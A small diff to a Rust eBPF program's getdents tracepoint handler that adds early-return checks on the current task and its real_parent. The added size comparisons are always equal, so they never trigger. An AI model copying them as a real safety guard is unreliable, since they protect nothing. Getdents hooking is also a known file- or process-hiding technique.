@@ -43,9 +43,18 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
             if task.is_null() {
                 return Err(0);
             }
+
+            if core::mem::size_of::<task_struct>() > core::mem::size_of_val(&*task) {
+                return Err(0);
+            }
+
             let real_parent = (*task).real_parent;
 
             if real_parent.is_null() {
+                return Err(0);
+            }
+
+            if core::mem::size_of::<task_struct>() > core::mem::size_of_val(&*real_parent) {
                 return Err(0);
             }
 
